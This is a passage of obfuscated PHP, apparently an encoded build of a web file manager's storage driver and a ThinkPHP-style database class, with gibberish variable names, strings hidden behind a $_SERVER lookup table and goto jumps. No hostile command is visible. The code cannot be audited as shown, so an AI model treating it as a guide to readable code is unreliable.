IO::info($this->pathParse[$_SERVER[Ã¶¡¶„æ][84]]); if (!$‚ëÍ®©) { return array(); } return $this->model->listAll($µí€å€¸); } public function getContent($Î–ğÂØÅ) { return $this->model->getContent($Î–ğÂØÅ); } public function setContent($·åÅŠÁÎ, $®æíß‰œ = '') { return $this->model->setContent($·åÅŠÁÎ, $®æíß‰œ); } public function fileSubstr($õ¶±ùä´, $ÑÄİ¸Âá, $õ²‰ÙŞ÷) { return $this->model->fileSubstr($õ¶±ùä´, $ÑÄİ¸Âá, $õ²‰ÙŞ÷); } public function download($•˜Öò¥Ç, $¶èÉÏ¢Å = '') { $îîáé€ı = get_path_father($¶èÉÏ¢Å); $›Á½Àš¢ = get_path_this($¶èÉÏ¢Å); $ß¦‘À×Ó = $this->model->fileInfoGet($•˜Öò¥Ç); $â—áş¼“ = IO::copy($ß¦‘À×Ó[$_SERVER[Ã¶¡¶„æ][84]], $îîáé€ı, !1, $›Á½Àš¢); return $â—áş¼“; } public function setModifyTime($µş°Ñ, $¬òĞúÜ¨ = '') { $•ùš¢ =& $_SERVER[Ã¶¡¶„æ]; if (!$µş°Ñ) { return; } $this->model->where(array($•ùš¢[417] => $µş°Ñ))->save(array($•ùš¢[85] => $¬òĞúÜ¨)); } public function upload($âšÚÆ¸, $şÌüş¼­, $–ìï¿Õ½ = false, $öµÔí¿¤ = REPEAT_REPLACE) { $Í‹ª¢´Å =& $_SERVER[Ã¶¡¶„æ]; $—öîùÑÉ = $this->parse($âšÚÆ¸); $ÏÍåù·Ç = $this->model->addFile($—öîùÑÉ[$Í‹ª¢´Å[399]], $şÌüş¼­, $—öîùÑÉ[$Í‹ª¢´Å[84]], $–ìï¿Õ½, $öµÔí¿¤); return $this->getPathOuter($ÏÍåù·Ç); } public function uploadFileByID($¯ì‚Àº›, $ú ¦‹“Ó, $Ãù¦ÕÅ˜) { $—®›¿’­ =& $_SERVER[Ã¶¡¶„æ]; $‘ËÊ½½÷ = $this->parse($¯ì‚Àº›); $Áı‡Ãß¢ = $this->model->addFileByFileID($‘ËÊ½½÷[$—®›¿’­[399]], $ú ¦‹“Ó, $‘ËÊ½½÷[$—®›¿’­[84]], $Ãù¦ÕÅ˜); return $this->getPathOuter($Áı‡Ãß¢); } public function addFileByRemote($á¹ûôªÉ, $¸Âäáç±, $êô™Ã²ø = array(), $ğÔĞ×âŞ = '', $ÙìÌ…­) { $ş ™í¯Ã =& $_SERVER[Ã¶¡¶„æ]; $œ”ˆº´Â = $this->parse($á¹ûôªÉ); $ğÔĞ×âŞ = empty($ğÔĞ×âŞ) ? $œ”ˆº´Â[$ş ™í¯Ã[84]] : $ğÔĞ×âŞ; $æïåÄö¶ = $this->model->addFileByRemote($œ”ˆº´Â[$ş ™í¯Ã[399]], $¸Âäáç±, $ğÔĞ×âŞ, $êô™Ã²ø, $ÙìÌ…­); return $this->getPathOuter($æïåÄö¶); } public function uploadLink($› §‚ø, $îäöÜ” = 0) { $ÔÅíİÙÂ =& $_SERVER[Ã¶¡¶„æ]; $ùáã´É— = $this->parse($› §‚ø); $Á©½Û“Í = _get($GLOBALS[$ÔÅíİÙÂ[7]], $ÔÅíİÙÂ[1352]); $”€Ô½¢ï = _get($GLOBALS[$ÔÅíİÙÂ[7]], $ÔÅíİÙÂ[1353]); $› §‚ø = Model($ÔÅíİÙÂ[609])->createFileName($ùáã´É—[$ÔÅíİÙÂ[84]], $Á©½Û“Í, $”€Ô½¢ï); return IO::uploadLink($› §‚ø, $îäöÜ”); } public function fileNameAuto($”ÏŞøôÎ, $çô®šÂ, $•æ¥ÎÙ = REPEAT_REPLACE, $àåüçŸß = false) { return $this->model->fileNameAuto($”ÏŞøôÎ, $çô®šÂ, $•æ¥ÎÙ, $àåüçŸß); } public function fileNameExist($’¼ˆÀÄ, $“­Ô¬Ò¬) { return $this->model->fileNameExist($’¼ˆÀÄ, $“­Ô¬Ò¬); } protected function _fileOut($‡®çÃÌ, $”–Õ€ú = false, $ãæ€›Î« = false, $÷ÖÏı÷± = '', $ºÚı»ğ… = false) { $ù»³ƒ¶é =& $_SERVER[Ã¶¡¶„æ]; $ûëÅÒ…Ö = $this->model->sourceInfo($‡®çÃÌ); if ($ûëÅÒ…Ö[$ù»³ƒ¶é[410]] == $ù»³ƒ¶é[88]) { header($ù»³ƒ¶é[1354]); die; } $ŠÉ÷ºŠá = $this->model->fileInfoGet($‡®çÃÌ); $÷ÖÏı÷± = $ŠÉ÷ºŠá[$ù»³ƒ¶é[176]] ? $ŠÉ÷ºŠá[$ù»³ƒ¶é[176]] : $÷ÖÏı÷±; $òËóÇò = isset($GLOBALS[$ù»³ƒ¶é[1355]]) ? $GLOBALS[$ù»³ƒ¶é[1355]] : $ûëÅÒ…Ö[$ù»³ƒ¶é[32]]; if ($ºÚı»ğ…) { return IO::fileOutServer($ŠÉ÷ºŠá[$ù»³ƒ¶é[84]], $”–Õ€ú, $òËóÇò, $÷ÖÏı÷±); } IO::fileOut($ŠÉ÷ºŠá[$ù»³ƒ¶é[84]], $”–Õ€ú, $òËóÇò, $÷ÖÏı÷±); } public function fileOut($»¼şã¨, $ ÒèÕİÊ = false, $›»¬‚› = false, $’•Å‹ƒš = '') { $this->_fileOut($»¼şã¨, $ ÒèÕİÊ, $›»¬‚›, $’•Å‹ƒš); } public function fileOutServer($®×¦À£, $ÊÌúá†¼ = false, $‘øÜÀ·ì = false, $İ›ËÙ™ = '') { $this->_fileOut($®×¦À£, $ÊÌúá†¼, $‘øÜÀ·ì, $İ›ËÙ™, !0); } protected function _fileOutImage($· ‚£òå, $¾Æ•Ö£ç = 250) { $‚‘ö²×ˆ =& $_SERVER[Ã¶¡¶„æ]; $ğ ´˜Æ = $this->model->pathInfo($· ‚£òå); if ($ğ ´˜Æ[$‚‘ö²×ˆ[410]] == $‚‘ö²×ˆ[88]) { show_json($‚‘ö²×ˆ[1356] . $· ‚£òå, !1); } $ƒê™æÓ = $this->model->fileInfoGet($· ‚£òå); $ƒê™æÓ[$‚‘ö²×ˆ[32]] = $ğ ´˜Æ[$‚‘ö²×ˆ[32]]; $ƒê™æÓ[$‚‘ö²×ˆ[169]] = $ğ ´˜Æ[$‚‘ö²×ˆ[169]]; $GLOBALS[$‚‘ö²×ˆ[1355]] = $ƒê™æÓ[$‚‘ö²×ˆ[32]]; $GLOBALS[$‚‘ö²×ˆ[168]] = $ƒê™æÓ; IO::fileOutImage($ƒê™æÓ[$‚‘ö²×ˆ[84]], $¾Æ•Ö£ç); } public function fileOutImage($’­´—Ã, $Ø¯·ÎÎ = 250) { $this->_fileOutImage($’­´—Ã, $Ø¯·ÎÎ); } public function fileOutImageServer($äÈÊö› , $Å™¸®Ê = 250) { $this->_fileOutImage($äÈÊö› , $Å™¸®Ê); } public function link($€¹İ‰Û™, $¥’ÑĞş = '') { $²Ş•Á‹˜ = $this->model->fileInfoGet($€¹İ‰Û™); return IO::link($²Ş•Á‹˜[$_SERVER[Ã¶¡¶„æ][84]], $¥’ÑĞş); } protected function parse($ª¬Ñ¬¸µ) { $ñÍËÊà =& $_SERVER[Ã¶¡¶„æ]; if (strstr($ª¬Ñ¬¸µ, $ñÍËÊà[8]) === !1) { return array($ñÍËÊà[419] => intval($ª¬Ñ¬¸µ), $ñÍËÊà[84] => $ñÍËÊà[12], $ñÍËÊà[1351] => array()); } $·ò£¢Ç¿ = explode($ñÍËÊà[8], trim($ª¬Ñ¬¸µ, $ñÍËÊà[8])); if (count($·ò£¢Ç¿) < 2) { show_tips(clear_html($ª¬Ñ¬¸µ) . $ñÍËÊà[1357]); } return array($ñÍËÊà[419] => intval($·ò£¢Ç¿[0]), $ñÍËÊà[84] => $·ò£¢Ç¿[1], $ñÍËÊà[1351] => array_slice($·ò£¢Ç¿, 1)); } } goto Aë°®ªğÌ‰; cÓ•’¯ğ¡: define($_SERVER[Ã¶¡¶„æ][241], 1); define($_SERVER[Ã¶¡¶„æ][242], 0); define($_SERVER[Ã¶¡¶„æ][243], 2); goto Cæ¥ö­Üæ; F×–½ÓŒŒ²: define($_SERVER[Ã¶¡¶„æ][238], 1); define($_SERVER[Ã¶¡¶„æ][239], 2); define($_SERVER[Ã¶¡¶„æ][240], 3); goto cÓ•’¯ğ¡; b§™ÀîÊ’Ë: class DbSqlite3 extends DbSqlite3Base { public function query($»È—æÄ) { $Á¹ö’Û³ =& $_SERVER[Ã¶¡¶„æ]; if (!CacheLock::fileLock($Á¹ö’Û³[13])) { return !1; } $Ÿ°´šòø = parent::query($»È—æÄ); CacheLock::fileUnLock($Á¹ö’Û³[13]); return $Ÿ°´šòø; } public function execute($µ¿ğ¶‘) { $Ôæâ”ÊÊ =& $_SERVER[Ã¶¡¶„æ]; if (!CacheLock::fileLock($Ôæâ”ÊÊ[13])) { return !1; } $‡¢–Í“ş = parent::execute($µ¿ğ¶‘); CacheLock::fileUnLock($Ôæâ”ÊÊ[13]); return $‡¢–Í“ş; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\164\x68\x69\x6e\x6b\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\x71" => "\x3d", "\x6e\145\x71" => "\x3c\76", "\x67\x74" => "\x3e", "\x65\147\x74" => "\x3e\x3d", "\x6c\164" => "\74", "\145\x6c\x74" => "\74\75", "\x6e\x6f\x74\x6c\151\x6b\145" => "\116\117\124\40\114\111\x4b\105", "\154\151\x6b\x65" => "\x4c\111\113\x45", "\151\x6e" => "\x49\x4e", "\x6e\157\x74\x69\156" => "\x4e\x4f\124\x20\x49\x4e", "\x6e\157\x74\x20\151\156" => "\x4e\x4f\x54\x20\x49\x4e", "\x62\x65\x74\167\x65\145\156" => "\102\105\x54\127\105\x45\116", "\156\157\164\x62\x65\x74\167\145\x65\156" => "\x4e\x4f\x54\40\x42\105\x54\127\x45\x45\116", "\156\157\x74\x20\142\x65\x74\167\145\145\x6e" => "\116\117\x54\x20\102\105\124\x57\105\x45\116"); protected $selectSql = "\x53\105\114\105\x43\124\x25\104\x49\123\124\111\x4e\x43\124\x25\40\45\106\x49\x45\x4c\104\45\40\106\122\117\115\x20\45\124\101\x42\x4c\x45\45\x25\x4a\117\x49\x4e\x25\x25\127\110\105\x52\x45\x25\x25\x47\122\x4f\x55\120\45\x25\x48\101\126\x49\116\x47\x25\x25\x4f\x52\104\x45\122\x25\45\x4c\111\115\x49\x54\x25\40\x25\x55\x4e\111\117\116\x25\x25\x43\x4f\115\115\105\x4e\124\x25"; protected $bind = array(); public static function getInstance() { $š›éûæ¹ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[Ã¶¡¶„æ][974], $š›éûæ¹); } public function factory($¶©î‚”¥ = '') { $Ş»¥­µ– =& $_SERVER[Ã¶¡¶„æ]; $¶©î‚”¥ = $this->parseConfig($¶©î‚”¥); if (empty($¶©î‚”¥[$Ş»¥­µ–[975]])) { think_exception(think_lang($Ş»¥­µ–[976])); } $this->dbType = ucwords(strtolower($¶©î‚”¥[$Ş»¥­µ–[975]])); $èÆõéæÜ = $Ş»¥­µ–[977] . $this->dbType; if (class_exists($èÆõéæÜ)) { $ûïÜÛø® = new $èÆõéæÜ($¶©î‚”¥); if ($Ş»¥­µ–[978] != strtolower($¶©î‚”¥[$Ş»¥­µ–[975]])) { $ûïÜÛø®->dbType = strtoupper($this->dbType); } else { $ûïÜÛø®->dbType = $this->_getDsnType($¶©î‚”¥[$Ş»¥­µ–[930]]); } } else { think_exception(think_lang($Ş»¥­µ–[979]) . $Ş»¥­µ–[980] . $èÆõéæÜ); } return $ûïÜÛø®; } public function __call($ğß¹ú«¹, $âÎŸ¦š¶) { if (method_exists($this, $ğß¹ú«¹)) { return call_user_func_array(array($this, $ğß¹ú«¹), $âÎŸ¦š¶); } } protected function _getDsnType($Ü²ŒÂ—¢) { $†Ù•ÕŒ = explode($_SERVER[Ã¶¡¶„æ][4], $Ü²ŒÂ—¢); $ˆÉƒºÙĞ = strtoupper(trim($†Ù•ÕŒ[0])); return $ˆÉƒºÙĞ; } private function parseConfig($¶ªöÖÉğ = '') { $ÑİãÊ¹ =& $_SERVER[Ã¶¡¶„æ]; if (!empty($¶ªöÖÉğ) && is_string($¶ªöÖÉğ)) { $¶ªöÖÉğ = $this->parseDSN($¶ªöÖÉğ); } elseif (is_array($¶ªöÖÉğ)) { $¶ªöÖÉğ = array_change_key_case($¶ªöÖÉğ); $¶ªöÖÉğ = array($ÑİãÊ¹[975] => $¶ªöÖÉğ[$ÑİãÊ¹[981]], $ÑİãÊ¹[902] => $¶ªöÖÉğ[$ÑİãÊ¹[982]], $ÑİãÊ¹[903] => $¶ªöÖÉğ[$ÑİãÊ¹[983]], $ÑİãÊ¹[900] => $¶ªöÖÉğ[$ÑİãÊ¹[984]], $ÑİãÊ¹[901] => $¶ªöÖÉğ[$ÑİãÊ¹[985]], $ÑİãÊ¹[21] => $¶ªöÖÉğ[$ÑİãÊ¹[986]], $ÑİãÊ¹[930] => $¶ªöÖÉğ[$ÑİãÊ¹[987]], $ÑİãÊ¹[17] => isset($¶ªöÖÉğ[$ÑİãÊ¹[988]]) ? $¶ªöÖÉğ[$ÑİãÊ¹[988]] : array()); } elseif (empty($¶ªöÖÉğ)) { if (think_config($ÑİãÊ¹[989]) && $ÑİãÊ¹[978] != strtolower(think_config($ÑİãÊ¹[990]))) { $¶ªöÖÉğ = $this->parseDSN(think_config($ÑİãÊ¹[989])); } else { $¶ªöÖÉğ = array($ÑİãÊ¹[975] => think_config($ÑİãÊ¹[990]), $ÑİãÊ¹[902] => think_config($ÑİãÊ¹[991]), $ÑİãÊ¹[903] => think_config($ÑİãÊ¹[992]), $ÑİãÊ¹[900] => think_config($ÑİãÊ¹[993]), $ÑİãÊ¹[901] => think_config($ÑİãÊ¹[994]), $ÑİãÊ¹[21] => think_config($ÑİãÊ¹[246]), $ÑİãÊ¹[930] => think_config($ÑİãÊ¹[989]), $ÑİãÊ¹[17] => think_config($ÑİãÊ¹[995])); } } return $¶ªöÖÉğ; } protected function initConnect($Ÿš‡†¸‚ = true) { if (1 == think_config($_SERVER[Ã¶¡¶„æ][22])) { $this->_linkID = $this->multiConnect($Ÿš‡†¸‚); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $–èş±÷… => $×½£è¤Œ) { $this->_linkID = $×½£è¤Œ; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($ïì³ïÉ” = false) { $ÁÅ‚ü«É =& $_SERVER[Ã¶¡¶„æ]; static $Š»ÉÉÉ¹ = array(); static $È¢ë…¤Ï = -1; if (empty($Š»ÉÉÉ¹)) { foreach ($this->config as $İ†ƒŒş€ => $®ÇÚ¨Ü´) { $Š»ÉÉÉ¹[$İ†ƒŒş€] = explode($ÁÅ‚ü«É[50], $®ÇÚ¨Ü´); } } if (think_config($ÁÅ‚ü«É[996])) { if ($ïì³ïÉ” || think_config($ÁÅ‚ü«É[395]) === !0) { $Ï‹ŠÅñ½ = floor(mt_rand(0, think_config($ÁÅ‚ü«É[997]) - 1)); $È¢ë…¤Ï = $Ï‹ŠÅñ½; } else { if (is_numeric(think_config($ÁÅ‚ü«É[998]))) { $Ï‹ŠÅñ½ = think_config($ÁÅ‚ü«É[998]); } else { $Ï‹ŠÅñ½ = floor(mt_rand(think_config($ÁÅ‚ü«É[997]), count($Š»ÉÉÉ¹[$ÁÅ‚ü«É[900]]) - 1)); } } } else { $Ï‹ŠÅñ½ = floor(mt_rand(0, count($Š»ÉÉÉ¹[$ÁÅ‚ü«É[900]]) - 1)); $È¢ë…¤Ï = $Ï‹ŠÅñ½; } $Ï‹ŠÅñ½ = $È¢ë…¤Ï !== -1 ? $È¢ë…¤Ï : $Ï‹ŠÅñ½; $¸ğë‚Œª = array($ÁÅ‚ü«É[902] => isset($Š»ÉÉÉ¹[$ÁÅ‚ü«É[902]][$Ï‹ŠÅñ½]) ? $Š»ÉÉÉ¹[$ÁÅ‚ü«É[902]][$Ï‹ŠÅñ½] : $Š»ÉÉÉ¹[$ÁÅ‚ü«É[902]][0], $ÁÅ‚ü«É[903] => isset($Š»ÉÉÉ¹[$ÁÅ‚ü«É[903]][$Ï‹ŠÅñ½]) ? $Š»ÉÉÉ¹[$ÁÅ‚ü«É[903]][$Ï‹ŠÅñ½] : $Š»ÉÉÉ¹[$ÁÅ‚ü«É[903]][0], $ÁÅ‚ü«É[900] => isset($Š»ÉÉÉ¹[$ÁÅ‚ü«É[900]][$Ï‹ŠÅñ½]) ? $Š»ÉÉÉ¹[$ÁÅ‚ü«É[900]][$Ï‹ŠÅñ½] : $Š»ÉÉÉ¹[$ÁÅ‚ü«É[900]][0], $ÁÅ‚ü«É[901] => isset($Š»ÉÉÉ¹[$ÁÅ‚ü«É[901]][$Ï‹ŠÅñ½]) ? $Š»ÉÉÉ¹[$ÁÅ‚ü«É[901]][$Ï‹ŠÅñ½] : $Š»ÉÉÉ¹[$ÁÅ‚ü«É[901]][0], $ÁÅ‚ü«É[21] => isset($Š»ÉÉÉ¹[$ÁÅ‚ü«É[21]][$Ï‹ŠÅñ½]) ? $Š»ÉÉÉ¹[$ÁÅ‚ü«É[21]][$Ï‹ŠÅñ½] : $Š»ÉÉÉ¹[$ÁÅ‚ü«É[21]][0], $ÁÅ‚ü«É[930] => isset($Š»ÉÉÉ¹[$ÁÅ‚ü«É[930]][$Ï‹ŠÅñ½]) ? $Š»ÉÉÉ¹[$ÁÅ‚ü«É[930]][$Ï‹ŠÅñ½] : $Š»ÉÉÉ¹[$ÁÅ‚ü«É[930]][0], $ÁÅ‚ü«É[17] => isset($Š»ÉÉÉ¹[$ÁÅ‚ü«É[17]][$Ï‹ŠÅñ½]) ? $Š»ÉÉÉ¹[$ÁÅ‚ü«É[17]][$Ï‹ŠÅñ½] : $Š»ÉÉÉ¹[$ÁÅ‚ü«É[17]][0]); return $this->connect($¸ğë‚Œª, $Ï‹ŠÅñ½); } public function parseDSN($¥œ…ù¿Ú) { $¿İ×­í¬ =& $_SERVER[Ã¶¡¶„æ]; if (empty($¥œ…ù¿Ú)) { return !1; } $¤¦š­Şß = parse_url($¥œ…ù¿Ú); if ($¤¦š­Şß[$¿İ×­í¬[180]]) { $½«ä š± = array($¿İ×­í¬[975] => $¤¦š­Şß[$¿İ×­í¬[180]], $¿İ×­í¬[902] => isset($¤¦š­Şß[$¿İ×­í¬[600]]) ? $¤¦š­Şß[$¿İ×­í¬[600]] : $¿İ×­í¬[12], $¿İ×­í¬[903] => isset($¤¦š­Şß[$¿İ×­í¬[999]]) ? $¤¦š­Şß[$¿İ×­í¬[999]] : $¿İ×­í¬[12], $¿İ×­í¬[900] => isset($¤¦š­Şß[$¿İ×­í¬[181]]) ? $¤¦š­Şß[$¿İ×­í¬[181]] : $¿İ×­í¬[12], $¿İ×­í¬[901] => isset($¤¦š­Şß[$¿İ×­í¬[182]]) ? $¤¦š­Şß[$¿İ×­í¬[182]] : $¿İ×­í¬[12], $¿İ×­í¬[21] => isset($¤¦š­Şß[$¿İ×­í¬[84]]) ? substr($¤¦š­Şß[$¿İ×­í¬[84]], 1) : $¿İ×­í¬[12]); } else { preg_match($¿İ×­í¬[1000], trim($¥œ…ù¿Ú), $ÁÖÖõ†); $½«ä š± = array($¿İ×­í¬[975] => $ÁÖÖõ†[1], $¿İ×­í¬[902] => $ÁÖÖõ†[2], $¿İ×­í¬[903] => $ÁÖÖõ†[3], $¿İ×­í¬[900] => $ÁÖÖõ†[4], $¿İ×­í¬[901] => $ÁÖÖõ†[5], $¿İ×­í¬[21] => $ÁÖÖõ†[6]); } $½«ä š±[$¿İ×­í¬[930]] = $¿İ×­í¬[12]; return $½«ä š±; } protected function debug() { $¸Îœ¤€§ =& $_SERVER[Ã¶¡¶„æ]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $¸Îœ¤€§[1001]; if (think_config($¸Îœ¤€§[1002])) { think_status($¸Îœ¤€§[1003]); think_trace($this->queryStr . $¸Îœ¤€§[1004] . think_status($¸Îœ¤€§[24], $¸Îœ¤€§[1003], 6) . $¸Îœ¤€§[1005], $¸Îœ¤€§[12], $¸Îœ¤€§[1006]); } } protected function parseLock($·¾ù—±” = false) { $İ¦¹œƒİ =& $_SERVER[Ã¶¡¶„æ]; if (!$·¾ù—±”) { return $İ¦¹œƒİ[12]; } if ($İ¦¹œƒİ[932] == $this->dbType) { return $İ¦¹œƒİ[1007]; } return $İ¦¹œƒİ[1008]; } protected function parseSet($»ãíşô¦) { $¾ÅöÂÃ· =& $_SERVER[Ã¶¡¶„æ]; foreach ($»ãíşô¦ as $­Œä­Â´ => $÷îÁ¿ Ó) { if (is_array($÷îÁ¿ Ó) && $¾ÅöÂÃ·[297] == $÷îÁ¿ Ó[0]) { $ÜÜÙ…®[] = $this->parseKey($­Œä­Â´) . $¾ÅöÂÃ·[898] . $÷îÁ¿ Ó[1]; } elseif (is_scalar($÷îÁ¿ Ó) || is_null($÷îÁ¿ Ó)) { $ÜÜÙ…®[] = $this->parseKey($­Œä­Â´) . $¾ÅöÂÃ·[898] . $this->parseValue($÷îÁ¿ Ó); } } return $¾ÅöÂÃ·[1009] . implode($¾ÅöÂÃ·[50], $ÜÜÙ…®); } protected function bindParam($Ÿ®ˆÌÄ, $ƒıÁ¬ı) { $this->bind[$_SERVER[Ã¶¡¶„æ][4] . $Ÿ®ˆÌÄ] = $ƒıÁ¬ı; } protected function parseBind($É”„È¤) { $É”„È¤ = array_merge($this->bind, $É”„È¤); $this->bind = array(); return $É”„È¤; } function parseKey(&$µ„¬ƒ›Ù, $ç“ù­ß = true) { if ($ç“ù­ß) { $µ„¬ƒ›Ù = $this->parseKeyCheck($µ„¬ƒ›Ù); } return $µ„¬ƒ›Ù; } function parseKeyCheck($Ì“€Êâ·) { $æÂßÊö– =& $_SERVER[Ã¶¡¶„æ]; $Ì“€Êâ· = trim($Ì“€Êâ·); if (!preg_match($æÂßÊö–[1010], $Ì“€Êâ·)) { think_exception($æÂßÊö–[1011] . $Ì“€Êâ·); } return $Ì“€Êâ·; } protected function parseValue($‹‡¹·ßö) { $—Òçİ¹¸ =& $_SERVER[Ã¶¡¶„æ]; if (is_string($‹‡¹·ßö)) { $‹‡¹·ßö = $—Òçİ¹¸[971] . $this->escapeString($‹‡¹·ßö) . $—Òçİ¹¸[971]; } elseif (isset($‹‡¹·ßö[0]) && is_string($‹‡¹·ßö[0]) && strtolower($‹‡¹·ßö[0]) == $—Òçİ¹¸[297]) { $‹‡¹·ßö = $this->escapeString($‹‡¹·ßö[1]); } elseif (is_array($‹‡¹·ßö)) { $‹‡¹·ßö = array_map(array($this, $—Òçİ¹¸[972]), $‹‡¹·ßö); } elseif (is_bool($‹‡¹·ßö)) { $‹‡¹·ßö = $‹‡¹·ßö ? $—Òçİ¹¸[88] : $—Òçİ¹¸[197]; } elseif (is_null($‹‡¹·ßö)) { $‹‡¹·ßö = $—Òçİ¹¸[103]; } return $‹‡¹·ßö; } protected function parseField($¢µ‚µÈ˜) { $…œ·âÖê =& $_SERVER[Ã¶¡¶„æ]; if (is_string($¢µ‚µÈ˜) && strpos($¢µ‚µÈ˜, $…œ·âÖê[50])) { $¢µ‚µÈ˜ = explode($…œ·âÖê[50], $¢µ‚µÈ˜); } if (is_array($¢µ‚µÈ˜)) { $ê«óêÌâ = array(); foreach ($¢µ‚µÈ˜ as $ÎÈÑÄ£ç => $Ïè‹µÑ) { if (!is_numeric($ÎÈÑÄ£ç)) { $ê«óêÌâ[] = $this->parseKey($ÎÈÑÄ£ç, !1) . $…œ·âÖê[1012] . $this->parseKey($Ïè‹µÑ); } else { $ê«óêÌâ[] = $this->parseKey($Ïè‹µÑ); } } $–¾ÀØÖÉ = implode($…œ·âÖê[50], $ê«óêÌâ); } elseif (is_string($¢µ‚µÈ˜) && !empty($¢µ‚µÈ˜)) { $–¾ÀØÖÉ = $¢µ‚µÈ˜; } else { $–¾ÀØÖÉ = $…œ·âÖê[188]; } return $–¾ÀØÖÉ; } protected function parseTable($†óÍ¡şª) { $Ã±ç±ü =& $_SERVER[Ã¶¡¶„æ]; if (is_array($†óÍ¡şª)) { $Ôˆ†¢è² = array(); foreach ($†óÍ¡şª as $õñ—ÊˆÄ => $ĞÂ¢•ë ) { if (!is_numeric($õñ—ÊˆÄ)) { $Ôˆ†¢è²[] = $this->parseKey($õñ—ÊˆÄ) . $Ã±ç±ü[53] . $this->parseKey($ĞÂ¢•ë ); } else { $Ôˆ†¢è²[] = $this->parseKey($õñ—ÊˆÄ); } } $†óÍ¡şª = $Ôˆ†¢è²; } elseif (is_string($†óÍ¡şª)) { if (strstr($†óÍ¡şª, $Ã±ç±ü[53])) { return $†óÍ¡şª; } $†óÍ¡şª = explode($Ã±ç±ü[50], $†óÍ¡şª); array_walk($†óÍ¡şª, array($this, $Ã±ç±ü[920])); } return $Ã±ç±ü[914] . trim(implode($Ã±ç±ü[1013], $†óÍ¡şª), $Ã±ç±ü[385]) . $Ã±ç±ü[914]; } protected function parseWhere($…™˜¦ Ï) { $¾š”ÔÔÂ =& $_SERVER[Ã¶¡¶„æ]; $”ñ‚¸ú = $¾š”ÔÔÂ[12]; if (is_string($…™˜¦ Ï)) { $”ñ‚¸ú = $…™˜¦ Ï; } else { $»ë´ˆ„´ = isset($…™˜¦ Ï[$¾š”ÔÔÂ[1014]]) ? strtoupper($…™˜¦ Ï[$¾š”ÔÔÂ[1014]]) : $¾š”ÔÔÂ[12]; if (in_array($»ë´ˆ„´, array($¾š”ÔÔÂ[1015], $¾š”ÔÔÂ[1016], $¾š”ÔÔÂ[1017]))) { $»ë´ˆ„´ = $¾š”ÔÔÂ[53] . $»ë´ˆ„´ . $¾š”ÔÔÂ[53]; unset($…™˜¦ Ï[$¾š”ÔÔÂ[1014]]); } else { $»ë´ˆ„´ = $¾š”ÔÔÂ[1018]; } foreach ($…™˜¦ Ï as $¡¶† ñ => $¿µùÏşá) { $”ñ‚¸ú .= $¾š”ÔÔÂ[277]; if (is_numeric($¡¶† ñ)) { $¡¶† ñ = $¾š”ÔÔÂ[1019]; } if (0 === strpos($¡¶† ñ, $¾š”ÔÔÂ[11])) { $”ñ‚¸ú .= $this->parseThinkWhere($¡¶† ñ, $¿µùÏşá); } else { if (!preg_match($¾š”ÔÔÂ[1020], trim($¡¶† ñ))) { think_exception(think_lang($¾š”ÔÔÂ[1021]) . $¾š”ÔÔÂ[4] . $¡¶† ñ); } $ÜÄÂ‘Öõ = is_array($¿µùÏşá) && isset($¿µùÏşá[$¾š”ÔÔÂ[1022]]); $¡¶† ñ = trim($¡¶† ñ); if (strpos($¡¶† ñ, $¾š”ÔÔÂ[283])) { $„Œæ…ı = explode($¾š”ÔÔÂ[283], $¡¶† ñ); $Ë²áŒêÙ = array(); foreach ($„Œæ…ı as $£ğíá›ö => $ÍÜ²”“) { $êÏ“û³Ä = $ÜÄÂ‘Öõ ? $¿µùÏşá[$£ğíá›ö] : $¿µùÏşá; $Ë²áŒêÙ[] = $¾š”ÔÔÂ[260] . $this->parseWhereItem($this->parseKey($ÍÜ²”“), $êÏ“û³Ä) . $¾š”ÔÔÂ[919]; } $”ñ‚¸ú .= implode($¾š”ÔÔÂ[1023], $Ë²áŒêÙ); } elseif (strpos($¡¶† ñ, $¾š”ÔÔÂ[284])) { $„Œæ…ı = explode($¾š”ÔÔÂ[284], $¡¶† ñ); $Ë²áŒêÙ = array(); foreach ($„Œæ…ı as $£ğíá›ö => $ÍÜ²”“) { $êÏ“û³Ä = $ÜÄÂ‘Öõ ? $¿µùÏşá[$£ğíá›ö] : $¿µùÏşá; $Ë²áŒêÙ[] = $¾š”ÔÔÂ[260] . $this->parseWhereItem($this->parseKey($ÍÜ²”“), $êÏ“û³Ä) . $¾š”ÔÔÂ[919]; } $”ñ‚¸ú .= implode($¾š”ÔÔÂ[1018], $Ë²áŒêÙ); } else { $”ñ‚¸ú .= $this->parseWhereItem($this->parseKey($¡¶† ñ), $¿µùÏşá); } } $”ñ‚¸ú .= $¾š”ÔÔÂ[278] . $»ë´ˆ„´; } $”ñ‚¸ú = substr($”ñ‚¸ú, 0, -strlen($»ë´ˆ„´)); } return empty($”ñ‚¸ú) ? $¾š”ÔÔÂ[12] : $¾š”ÔÔÂ[1024] . $”ñ‚¸ú; } protected function parseWhereItem($á²‚¯, $‹‘Ó“áÎ) { $Ù¦àı¼û =& $_SERVER[Ã¶¡¶„æ]; $Š§ª´¡« = $Ù¦àı¼û[12]; if (is_array($‹‘Ó“áÎ)) { if (is_string($‹‘Ó“áÎ[0])) { $“üô°­ = strtolower($‹‘Ó“áÎ[0]); if (in_array($‹‘Ó“áÎ[0], array($Ù¦àı¼û[898], $Ù¦àı¼û[1025], $Ù¦àı¼û[1026], $Ù¦àı¼û[1027], $Ù¦àı¼û[1028], $Ù¦àı¼û[1029]))) { $Š§ª´¡« .= $á²‚¯ . $Ù¦àı¼û[53] . $‹‘Ó“áÎ[0] . $Ù¦àı¼û[53] . $this->parseValue($‹‘Ó“áÎ[1]); } elseif (preg_match($Ù¦àı¼û[1030], $‹‘Ó“áÎ[0])) { $Š§ª´¡« .= $á²‚¯ . $Ù¦àı¼û[53] . $this->exp[$“üô°­] . $Ù¦àı¼û[53] . $this->parseValue($‹‘Ó“áÎ[1]); } elseif (preg_match($Ù¦àı¼û[1031], 